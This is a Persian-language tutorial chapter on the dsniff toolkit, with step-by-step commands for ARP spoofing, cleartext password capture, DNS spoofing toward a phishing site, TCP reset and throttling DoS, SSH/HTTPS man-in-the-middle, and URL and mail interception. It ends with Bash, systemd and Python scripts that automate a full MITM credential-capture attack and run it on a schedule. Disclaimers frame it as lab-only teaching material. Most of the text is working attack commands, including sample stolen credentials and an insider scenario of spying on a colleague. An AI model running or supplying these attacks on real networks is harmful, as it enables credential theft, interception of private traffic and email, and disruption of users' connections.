**تأکید مجدد:** کلیه حملات شرح داده شده در این بخش صرفاً جنبه آموزشی داشته و صرفاً برای استفاده در محیط‌های آزمایشگاهی و تحت نظارت مربیان متخصص طراحی شده است. اجرای این حملات در شبکه‌های بدون اخذ مجوز کتبی، غیرقانونی بوده و پیگرد قانونی دارد.
###### Attack 1: ARP Spoofing - `arpspoof`
- **سناریو و محل استفاده**
از این حمله زمانی استفاده می‌شود که مهاجم و هدف در یک شبکه محلی (LAN) قرار دارند و مهاجم قصد دارد ترافیک شبکه بین هدف و دروازه (gateway) را شنود کند.

- **نمونه سناریو:**
در یک شرکت کوچک از سوئیچ‌های قدیمی استفاده می‌شود. مهاجم داخلی (کارمند شرکت) می‌خواهد ترافیک HTTP همکار خود را که از یک سرویس تحت وب استفاده می‌کند، مشاهده کند.

- **مکانیزم عملکرد:**
پروتکل ARP فاقد مکانیزم احراز هویت است. مهاجم با ارسال پاسخ‌های ARP جعلی به هدف، خود را به جای دروازه (gateway) معرفی می‌کند. همزمان به دروازه نیز اعلام می‌کند که خود به جای هدف است. در نتیجه تمام ترافیک بین هدف و دروازه از سیستم مهاجم عبور می‌کند.

- **دیاگرام ساده شده:**
```
هدف (Victim) -----> مهاجم (Attacker) -----> Gateway
     <-----              <-----              <-----
```

- **نکته:** این حمله پیش‌نیاز بسیاری از حملات دیگر است. مثلا در حملات DNS Spoofing, Password Extraction , .... ابتدا باید ARP Spoofing را برای هدایت ترافیک هدف به سمت خود اجرا کرد.
---------

- **روش پیاده‌سازی گام‌به‌گام:**

1. **مرحله 1: شناسایی اطلاعات شبکه** 
	در این مرحله باید آدرس IP هدف و Gateway خود را بدست بیاوریم. برای یافتن دستگاه‌های فعال درون شبکه روش های دیگری هم وجود دارد (مانند استفاده از `nmap` یا `netdiscover`)
```sh
#مشاهده جدول مسیریابی برای یافتن => gateway
ip route show

#اسکن شبکه برای یافتن دستگاه‌های متصل (اختیاری)
fping -g 192.168.1.0/24 2>/dev/null

#روش دوم یافتن دستگاه های فعال شبکه - nmap ARP Ping Scan
sudo nmap -PR -sn 192.168.1.0/24

#روش سوم یافتن دستگاه های فعال شبکه - nmap ICMP Echo Ping
sudo nmap -PE -sn 192.168.1.0/24

#روش چهارم یافتن دستگاه های فعال شبکه - netdiscover with ARP
sudo apt update -y && sudo apt install -y netdiscover
sudo netdiscover -r 192.168.1.0/24 -i eth0

#روش پنجم یافتن دستگاه های فعال شبکه - netdiscover Passive Mode
sudo netdiscover -p -i eth0

#روش ششم یافتن دستگاه های فعال شبکه - netdiscover Fast Scan
sudo netdiscover -r 192.168.1.0/24 -i eth0 -f
```

2. **مرحله 2: فعال‌سازی IP forwarding**
برای اینکه هدف بتواند به اینترنت دسترسی داشته باشد و متوجه حمله نشود، باید IP Forwarding را فعال کنیم تا دستگاه ما بتواند بسته ها را از خود عبور دهد.
```sh
echo 1 > /proc/sys/net/ipv4/ip_forward
```

3. **مرحله 3: اجرای arpspoof برای فریب هدف**
در یک ترمینال، دستور زیر را اجرا می‌کنیم (فرض کنید هدف 192.168.1.10 و gateway 192.168.1.1 است):
```sh
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
```
این دستور به هدف می‌گوید که آدرس MAC مربوط به IP Gateway، برابر با آدرس MAC سیستم ما است.

4. **مرحله 4: اجرای arpspoof برای فریب Gateway**
در ترمینال دوم، دستور زیر را اجرا می‌کنیم:
```sh
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.10
```
این دستور به Gateway می‌گوید که آدرس MAC مربوط به IP هدف، برابر با آدرس MAC سیستم ما است.

5. **مرحله 5: تأیید موفقیت حمله**
می‌توانیم با اجرای `wireshark` یا `tcpdump` مشاهده کنیم که بسته‌های هدف از سیستم ما عبور می‌کنند:
```sh
sudo tcpdump -i eth0 host 192.168.1.10
```

6. **مرحله 6: توقف حمله (پاکسازی)**
پس از اتمام کار، فرآیندهای arpspoof را در هر دو ترمینال با `Ctrl+C` متوقف کرده و IP Forwarding را غیرفعال می‌کنیم:
```sh
echo 0 > /proc/sys/net/ipv4/ip_forward
```

###### Attack 2: Password Extraction - `dsniff`
- **سناریو و محل استفاده:**
پس از اجرای موفق ARP Spoofing (یا در شبکه‌های هاب)، از ابزار `dsniff` برای استخراج رمزهای عبور ارسالی به صورت متن واضح (cleartext) استفاده می‌شود.

- **نمونه سناریو:** 
پس از قرار گرفتن در موقعیت MITM، می‌خواهیم رمزهای عبور پروتکل‌هایی مانند FTP، POP3، IMAP، HTTP (Basic Auth)، Telnet و ... را جمع‌آوری کنیم.

- **مکانیزم عملکرد:**
ابزار dsniff با بازسازی جریان TCP و جستجوی الگوهای مربوط به هر پروتکل (مانند دستورات USER/PASS در FTP یا Authorization header در HTTP)، اطلاعات احراز هویت را استخراج می‌کند.

----------

- **روش پیاده‌سازی گام‌به‌گام:**

1. **مرحله 1: اجرای ARP Spoofing (همانند حمله 1)**
ابتدا حمله ARP Spoofing را که در مثال قبلی توضیح دادیم اجرا می‌کنیم تا ترافیک هدف به سمت ما هدایت شود.

2. **مرحله 2: اجرای dsniff**
در ترمینال سوم، dsniff را با گزینه‌های مناسب اجرا می‌کنیم:
```sh
#اجرای ساده - نمایش رمزهای عبور در خروجی استاندارد
sudo dsniff -i eth0

#اجرای پیشرفته با بازسازی جریان برای ترافیک نامتقارن
sudo dsniff -i eth0 -c -v

#ذخیره جلسات در فایل برای تحلیل بعدی
sudo dsniff -i eth0 -w captured_passwords.dump
```

3. **مرحله 3: خروجی نمونه**
پس از اینکه کاربر هدف وارد یک سرویس FTP یا POP3 شود، خروجی زیر مشاهده می‌شود.
```
dsniff: listening on eth0
----------------------------
09/15/21 14:32:15 tcp 192.168.1.10.3456 -> 192.168.1.5.21 (ftp)
USER admin
PASS mysecret123

09/15/21 14:35:22 tcp 192.168.1.10.4567 -> 172.217.16.14.80 (http)
Authorization: Basic YWRtaW46c2VjcmV0
```

4. **مرحله 4: تحلیل فایل ذخیره شده (اختیاری)**
اگر قبلاً با گزینه `-w` جلسات را ذخیره کرده‌ایم به روش زیر فایل ذخیره شده را میخوانیم و تحلیل میکنیم:
```sh
dsniff -r captured_passwords.dump
```

###### Attack 3: DSN Spoofing - `dnsspoof`
- **سناریو و محل استفاده:**
از این حمله زمانی استفاده می‌شود که می‌خواهیم کاربر هدف را به جای سایت واقعی، به یک سایت جعلی (مثلاً برای انجام حمله فیشینگ) هدایت کنیم.

- **نمونه سناریو:**
مهاجم می‌خواهد کاربران یک سازمان را هنگام مراجعه به سایت www.facebook.com به یک سایت جعلی با ظاهر مشابه هدایت کند تا اطلاعات ورود آنها را برداشت کند.

- **مکانیزم عملکرد:**
ابزار dnsspoof به درخواست‌های DNS کاربر گوش می‌دهد و به جای سرور DNS واقعی، یک پاسخ جعلی همراه با آدرس IP مورد نظر مهاجم ارسال می‌کند.

-------

- **روش پیاده‌سازی گام‌به‌گام:**

1. **مرحله 1: ایجاد فایل `dns.spoof` - قوانین جعل DNS**
یک فایل متنی حاوی قوانین جعلی با فرمت `[IP جعلی] [دامنه]` ایجاد می‌کنیم.
```sh
echo "192.168.1.100 www.facebook.com" > dns.spoof
echo "192.168.1.100 login.facebook.com" >> dns.spoof
```
آدرس 192.168.1.100 متعلق به سرور جعلی مهاجم است که یک سایت فیشینگ روی آن اجرا می‌شود.

2. **مرحله 2: فعال‌سازی IP forwarding**
```sh
echo 1 > /proc/sys/net/ipv4/ip_forward
```

3. **مرحله 3: اجرای ARP Spoofing (پیش‌نیاز)**
در این مرحله ARP Spoofing را برای هدایت ترافیک DNS هدف به سمت خود راه اندازی میکنیم.

4. **مرحله 4: اجرای dnsspoof**
```sh
sudo dnsspoof -i eth0 -f dns.spoof
```
نکته: اگر فایل `dns.spoof` مشخص نشود، dnsspoof به تمام درخواست‌های DNS با IP سیستم خود پاسخ می‌دهد.

5. **مرحله 5: تأیید حمله**
روی دستگاه هدف، کامند زیر را اجرا می‌کنیم. کامند `nslookup` سرور DSN را به همراه IP که برای این دامنه از DNS Server دریافت شده را نشان میدهد.
```sh
nslookup www.facebook.com
```
خروجی باید IP جعلی (192.168.1.100) را نشان دهد.

###### Attack 4: TCP Kill DoS - `tcpkill`
- **سناریو و محل استفاده:**
از این حمله زمانی استفاده می‌شود که می‌خواهیم اتصالات خاصی را در شبکه قطع کنیم. این حمله نوعی از حملات انکار سرویس DoS است که باعث ازکارفتادن عملکرد اصلی شبکه میشود.

- **نمونه سناریو:** 
قطع اتصالات SSH یک کاربر خاص برای وادار کردن او به استفاده از پروتکل رمزنگاری نشده.

- **مکانیزم عملکرد:**
ابزار tcpkill با ارسال بسته‌های RST (Reset) جعلی با شماره سکانس مناسب، اتصال TCP را در هر دو طرف می‌بندد.

--------

- **روش پیاده‌سازی گام‌به‌گام:**

1. **مرحله 1: قطع تمام اتصالات SSH (پورت 22)**
```sh
sudo tcpkill -i eth0 port 22
```

2. **مرحله 2: قطع اتصالات HTTP یک کلاینت خاص**
```sh
sudo tcpkill -i eth0 host 192.168.1.10 and port 80
```

3. **مرحله 3: قطع اتصالات با درجه قدرت بالاتر (برای اتصالات پرسرعت)**
```sh
sudo tcpkill -i eth0 -7 port 443
```
مقادیر بالاتر `1-` تا `9-` برای اتصالات پرسرعت مناسب‌تر هستند.

###### Attack 5: TCP Throttling DoS - `tcpnice`
- **سناریو و محل استفاده:**
از این حمله برای کاهش عمدی پهنای باند یک اتصال خاص استفاده می‌شود. این حمله از نوع DoS محسوب میشود.

- **روش پیاده‌سازی گام‌به‌گام:**

1. **مثال 1: کاهش سرعت اتصالات HTTP با روش Tiny Window**
```sh
sudo tcpnice -A -i eth0 port 80
```

2. **مثال 2: کاهش سرعت تمام اتصالات یک کلاینت خاص**
```sh
sudo tcpnice -i eth0 host 192.168.1.10
```

###### Attack 6: SSH MITM - `sshmitm`
- **سناریو و محل استفاده:**
از این حمله در شبکه‌هایی استفاده می‌شود که هنوز از SSH نسخه 1 استفاده می‌کنند (بسیار قدیمی و ناامن). 

- **مکانیزم عملکرد:**
ابزار sshmitm به عنوان یک پروکسی شفاف عمل کرده و جلسه SSH را رمزگشایی می‌کند. این حمله تنها روی SSH نسخه 1 کار می‌کند، زیرا SSH نسخه 2 دارای مکانیزم تأیید هویت سرور است.

- **روش پیاده‌سازی گام‌به‌گام:**

1. **مرحله 1: فعال‌سازی IP forwarding و اجرا ARP spoofing**
```sh
echo 1 > /proc/sys/net/ipv4/ip_forward
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
```

2. **مرحله 2: اجرای sshmitm**
```sh
sudo sshmitm -i eth0
```

3. **مرحله 3: ذخیره لاگ جلسه رمزگشایی شده (اختیاری)**
```sh
sudo sshmitm -i eth0 -l captured_ssh_session.log
```

###### Attack 7: HTTP/HTTPS MITM - `webmitm`
- **سناریو و محل استفاده:**
از این حمله برای رهگیری ترافیک HTTP/HTTPS (وب) استفاده میشود.

- **مکانیزم عملکرد:**
ابزار webmitm با یک گواهی SSL خودامضا (self-signed) با کلاینت ارتباط برقرار کرده و همزمان با سرور واقعی ارتباط SSL جداگانه‌ای برقرار می‌کند. مرورگر هدف هشدار امنیتی نمایش می‌دهد، اما اگر کاربر آن را نادیده بگیرد، ترافیک رمزگشایی می‌شود.

- **روش پیاده‌سازی گام‌به‌گام:**

1. **مرحله 1: ایجاد فایل `dns.spoof`-  قوانین DNS Spoofing**
```sh
echo "192.168.1.100 www.example.com" > dns.spoof
```

2. **مرحله 2: اجرای dnsspoof و arpspoof**
```sh
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
sudo dnsspoof -i eth0 -f dns.spoof
```

3. **مرحله 3: اجرای webmitm**
```sh
sudo webmitm -i eth0
```

###### Attack 8: URL Snarfing - `urlsnarf`
- **سناریو و محل استفاده:**
از این حمله برای ثبت آدرس‌های اینترنتی بازدید شده توسط کاربران استفاده می‌شود. 

- **مکانیزم عملکرد:**
ابزار urlsnarf به درخواست‌های HTTP گوش می‌دهد و URL کامل را در قالب Common Log Format (CLF) ثبت می‌کند.

- **روش پیاده‌سازی گام‌به‌گام:**

1. **مرحله 1: اجرای ARP Spoofing (در صورت نیاز)**
```sh
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
```

2. **مرحله 2: اجرای urlsnarf**
```sh
sudo urlsnarf -i eth0

#ذخیره در فایل لاگ
sudo urlsnarf -i eth0 > urls.log
```

- **خروجی نمونه:**
```
192.168.1.10 - - [15/Sep/2024:14:35:22 +0000] "GET https://www.example.com/login HTTP/1.1" - -
192.168.1.10 - - [15/Sep/2024:14:35:25 +0000] "POST https://mail.google.com/ HTTP/1.1" - -
```

###### Attack 9: Mail Snarfing - `mailsnarf`
- **سناریو و محل استفاده:**
از این حمله برای رهگیری ایمیل‌های در حال انتقال از طریق پروتکل‌های POP3 و SMTP استفاده می‌شود.

- **مکانیزم عملکرد:**
ابزار mailsnarf جریان‌های POP3 و SMTP را شناسایی کرده و محتوای کامل ایمیل‌ها (شامل header و body) را در قالب mbox ذخیره می‌کند.

- **روش پیاده‌سازی گام‌به‌گام:**

1. **مرحله 1: اجرای ARP Spoofing**
```sh
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
```

2. **مرحله 2: اجرای mailsnarf**
```sh
#ذخیره ایمیل‌ها در فایل mbox
sudo mailsnarf -i eth0 > captured_mails.mbox

#مشاهده ایمیل‌های ذخیره شده با => mutt
mutt -f captured_mails.mbox
```
###### Attack 10: MAC Flooding - `macof`
- **سناریو و محل استفاده:**
از این حمله در شبکه‌های سوئیچ شده قدیمی استفاده می‌شود. با پر کردن جدول CAM سوئیچ، سوئیچ به حالت هاب تغییر وضعیت داده و تمام ترافیک را به تمام پورت‌ها ارسال می‌کند.

- **مکانیزم عملکرد:**
ابزار macof بسته‌هایی با آدرس‌های MAC مبدأ تصادفی تولید کرده و به شبکه می‌فرستد تا جدول CAM سوئیچ پر شود.

- **روش پیاده‌سازی گام‌به‌گام:**
```sh
#ارسال بسته‌های حاوی آدرس‌های مک تصادفی
sudo macof -i eth0

#ارسال تعداد مشخصی بسته
sudo macof -i eth0 -n 1000

#ارسال با آدرس مبدأ و مقصد جعلی مشخص
sudo macof -i eth0 -s 192.168.1.100 -d 192.168.1.1
```
**توجه:** سوئیچ‌های مدرن دارای محافظت در برابر این حمله هستند و این تکنیک عمدتاً جنبه آموزشی دارد.

##### dsniff Conclusion
در این فصل، با مجموعه ابزارهای **dsniff** آشنا شدیم؛ مجموعه‌ای که توسط **Dug Song** با هدف نمایان ساختن نقاط ضعف پروتکل‌های رمزنگاری نشده شبکه توسعه یافته است. این ابزارها که به چهار دسته اصلی تقسیم می‌شوند، از تکنیک‌های **نظارت غیرفعال** (مانند dsniff، urlsnarf و mailsnarf) برای استخراج اطلاعات در حال عبور و **تکنیک‌های رهگیری فعال** (مانند arpspoof، dnsspoof و macof) برای هدایت ترافیک به سمت مهاجم استفاده می‌کنند. همچنین ابزارهایی مانند **sshmitm** و **webmitm** حملات مرد میانی را روی پروتکل‌های رمزنگاری شده پیاده‌سازی می‌کنند و **tcpkill** و **tcpnice** امکان دستکاری جریان TCP را فراهم می‌آورند.

همان‌طور که در طول فصل مشاهده کردیم، اگر پروتکلی به صورت **متن واضح (cleartext)** اطلاعات را ارسال کند، هیچ محافظتی در برابر ابزارهایی مانند dsniff وجود ندارد. این مهم‌ترین درسی است که این ابزار به ما می‌آموزد: **ضرورت استفاده از پروتکل‌های رمزنگاری شده** مانند HTTPS، SSH و SFTP در تمام ارتباطات شبکه.

**تأکید اخلاقی:** داگ سانگ، توسعه‌دهنده این ابزارها، در مستندات رسمی خود تصریح کرده است: «من dsniff را با نیتی صادقانه نوشتم - برای ممیزی شبکه خودم و نشان دادن ناامنی پروتکل‌های رمزنگاری نشده شبکه. لطفاً از این نرم‌افزار سوءاستفاده نکنید»

کلیه محتوای این فصل صرفاً جنبه **آموزشی** داشته و برای استفاده در **محیط‌های آزمایشگاهی و تحت نظارت مربیان متخصص** طراحی شده است. هرگونه استفاده نابجا از این ابزارها در شبکه‌های بدون مجوز، غیرقانونی بوده و بر عهده استفاده‌کننده می‌باشد.

با تسلط بر ابزارهای dsniff، اکنون قادر خواهید بود:
- معماری و نقاط ضعف پروتکل‌های لایه کاربردی (مانند HTTP، FTP، POP3، IMAP و DNS) را در عمل مشاهده کنید.
    
- حملات مرد میانی را در سطح شبکه محلی پیاده‌سازی کنید.
    
- ترافیک رمزنگاری شده SSH نسخه 1 و HTTPS (در شرایط خاص) را رهگیری کنید.
    
- جریان TCP را قطع یا محدود کنید.
    
- درک عمیقی از اهمیت رمزنگاری در طراحی سیستم‌های امن پیدا کنید.
##### Bonus: dsniff Suite Automation
خودکارسازی (Automation) در مجموعه dsniff به معنای اجرای خودکار ابزارها با تنظیمات خاص، ذخیره نتایج برای تحلیل بعدی، و ترکیب چندین ابزار برای انجام عملیات پیچیده‌تر است. در این بخش، روش‌های مختلف خودکارسازی را با مثال‌های کاربردی بررسی می‌کنیم.
###### روش اول: خودکارسازی با اسکریپت‌های Bash
###### 1: Automation with Bash Script
1. **مثال 1: اسکریپت خودکار حمله MITM بصورت کامل**
```sh
#!/bin/bash
#mitm_automation.sh - اسکریپت خودکارسازی حمله مرد میانی

#تنظیمات اولیه
INTERFACE="eth0"
TARGET_IP="192.168.1.10"
GATEWAY_IP="192.168.1.1"
LOG_DIR="/var/log/dsniff"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")

#ایجاد دایرکتوری لاگ
mkdir -p $LOG_DIR

#فعال‌سازی IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

#Run arpspoof => در پس زمینه
sudo arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY_IP > $LOG_DIR/arpspoof_$TIMESTAMP.log 2>&1 &
ARP_PID=$!

sudo arpspoof -i $INTERFACE -t $GATEWAY_IP $TARGET_IP >> $LOG_DIR/arpspoof_$TIMESTAMP.log 2>&1 &
ARP_GW_PID=$!

#Run dsniff => ذخیره نتایج
sudo dsniff -i $INTERFACE -c -v -N -w $LOG_DIR/sessions_$TIMESTAMP.dump

#پاکسازی پس از اتمام
kill $ARP_PID $ARP_GW_PID
echo 0 > /proc/sys/net/ipv4/ip_forward
```

2. **مثال 2: اسکریپت خودکار نظارت دوره‌ای**
```sh
#!/bin/bash
#periodic_monitor.sh - نظارت دوره‌ای بر ترافیک شبکه

INTERFACE="eth0"
OUTPUT_DIR="/var/log/dsniff"
DURATION=60  #sniffing time => در هر بار (ثانیه)

while true; do
    TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
    echo "Start sniffing in $TIMESTAMP"
    
    sudo timeout $DURATION dsniff -i $INTERFACE -n > $OUTPUT_DIR/sniff_$TIMESTAMP.log
    
    echo "Scan Completed. Wait for $((DURATION * 2)) Second ..."
    sleep $((DURATION * 2))
done
```

3. **مثال 3: اسکریپت خودکار برای شناسایی رمزهای عبور HTTP**
```sh
#!/bin/bash
#http_pass_monitor.sh - نظارت بر رمزهای عبور HTTP

INTERFACE="eth0"
ALERT_EMAIL="admin@example.com"

sudo dsniff -i $INTERFACE -n 'tcp port 80' | while read line; do
    echo "$(date): $line" >> http_passwords.log
    
    #بررسی وجود عبارت "Authorization" => برای شناسایی رمز عبور
    if echo "$line" | grep -q "Authorization"; then
        echo "Warning: HTTP Password Detected!" | mail -s "DSNIFF Alert" $ALERT_EMAIL
    fi
done
```

###### 2: Automation with systemd Timer
ایجاد یک سرویس systemd برای اجرای خودکار dsniff به عنوان یک Daemon:

1. **ایجاد فایل Service Unit:** اجرای کامند dsniff یا اسکریپت اتوماسیون پس از بالا آمدن سرویس شبکه با دسترسی root
	`/etc/systemd/system/dsniff-sniffer.service`
```sh
[Unit]
Description=DSNIFF Network Sniffer
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/dsniff -i eth0 -w /var/log/dsniff/output.log
ExecStop=/usr/bin/killall dsniff
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target
```
- اگر بخواهیم بجای اجرای `dsniff` در حالت کامند، یک اسکریپ شخصی سازی شده را اجرا کنیم مقدار `ExecStart` را برابر آدرس اسکریپت قرار دهیم.
	`ExecStart=/usr/local/bin/dsniff-automated.sh`

2. **ایجاد فایل Timer:** اجرای دائم هر یک ساعت
	`/etc/systemd/system/dsniff-sniffer.timer`
```sh
[Unit]
Description=Run DSNIFF sniffer every hour

[Timer]
OnCalendar=hourly
Persistent=true

[Install]
WantedBy=timers.target
```

3. **فعالسازی و مدیریت Timer:**
```sh
#بارگذاری مجدد پیکربندی => systemd
sudo systemctl daemon-reload

#فعال‌سازی و اجرای فوری => timer
sudo systemctl enable --now dsniff-sniffer.timer

#توقف و غیرفعالسازی تایمر
sudo systemctl stop dsniff-sniffer.timer
sudo systemctl disable dsniff-sniffer.timer
```

- **بررسی وضعیت Timer ها:**
```sh
#بررسی وضعیت تایمر و زمان اجرای بعدی
sudo systemctl status dsniff-sniffer.timer

#برای مشاهده لیست تمام تایمرهای فعال
sudo systemctl list-timers --all
```

```sh
#!/bin/bash
#dsniff_alert.sh - اسکریپت هشدار خودکار

INTERFACE="eth0"
ALERT_THRESHOLD=3  #تعداد هشدارها قبل از ارسال ایمیل
COUNTER=0

#تابع ارسال هشدار
send_alert() {
    local message=$1
    echo "$(date) - $message" >> alerts.log
    COUNTER=$((COUNTER + 1))
    
    if [ $COUNTER -ge $ALERT_THRESHOLD ]; then
        echo "$message" | mail -s "DSNIFF Security Alert" admin@example.com
        COUNTER=0
    fi
}

sudo dsniff -i $INTERFACE | while read line; do
    if echo "$line" | grep -qiE "(password|pass|login|username|user)"; then
        send_alert "Credential detected: $line"
    fi
    
    if echo "$line" | grep -qi "Authorization: Basic"; then
        send_alert "HTTP Basic Auth detected: $line"
    fi
done
```

```sh
#!/bin/bash
#batch_analysis.sh - پردازش دسته‌ای فایل‌های ذخیره شده

INPUT_DIR="/var/log/dsniff/raw"
OUTPUT_DIR="/var/log/dsniff/analyzed"
ARCHIVE_DIR="/var/log/dsniff/archive"

#ایجاد دایرکتوری‌های مورد نیاز

for dumpfile in $INPUT_DIR/*.dump; do
    filename=$(basename "$dumpfile")
    base="${filename%.*}"
    
    echo "در حال پردازش $filename..."
    
    #تحلیل فایل با dsniff
    dsniff -r "$dumpfile" > "$OUTPUT_DIR/${base}_passwords.txt"
    
    #استخراج URL
    urlsnarf -r "$dumpfile" > "$OUTPUT_DIR/${base}_urls.txt"
    
    #منتقل کردن فایل به آرشیو
    mv "$dumpfile" "$ARCHIVE_DIR/"
    
    echo "پردازش $filename کامل شد."
done
```

```python
#!/usr/bin/env python3
#dsniff_automator.py

import subprocess
import time
import signal
import os
from datetime import datetime

class DsniffAutomator:
    def __init__(self, interface='eth0', output_dir='/var/log/dsniff'):
        self.interface = interface
        self.output_dir = output_dir
        self.process = None
        
    def start_sniffing(self, duration=60, filter_expr=None):
        """Start sniffing in Specific Time"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = f"{self.output_dir}/sniff_{timestamp}.dump"
        
        cmd = ['sudo', 'dsniff', '-i', self.interface, '-w', output_file]
        
        if filter_expr:
            cmd.extend(['-n', filter_expr])
        
        print(f"[*] Start sniffing in {duration} Second...")
        self.process = subprocess.Popen(cmd)
        time.sleep(duration)
        self.stop_sniffing()
        
        return output_file
    
    def stop_sniffing(self):
        """Stop sniffing"""
        if self.process:
            self.process.send_signal(signal.SIGINT)
            self.process.wait()
            print("[*] Sniffing Stopped.")
    
    def analyze_session(self, session_file):
        """Analyze Saved Sessions"""
        cmd = ['dsniff', '-r', session_file]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout
    
    def run_mitm_attack(self, target_ip, gateway_ip, duration=60):
        """Run Full MITM Attack"""
        #Enable IP forwarding
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
        
        #Run arpspoof
        arp1 = subprocess.Popen(['sudo', 'arpspoof', '-i', self.interface, 
                                 '-t', target_ip, gateway_ip])
        arp2 = subprocess.Popen(['sudo', 'arpspoof', '-i', self.interface, 
                                 '-t', gateway_ip, target_ip])
        
        #Run dsniff
        session_file = self.start_sniffing(duration)
        
        #Clear
        arp1.terminate()
        arp2.terminate()
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'])
        
        return self.analyze_session(session_file)

#Use from Class
if __name__ == "__main__":
    automator = DsniffAutomator(interface='eth0')
    
    # اجرای سریع sniffing => به مدت 30 ثانیه
    session = automator.start_sniffing(duration=30)
    
    #تحلیل نتایج
    results = automator.analyze_session(session)
    print("[+] Detected Results:")
    print(results)
```
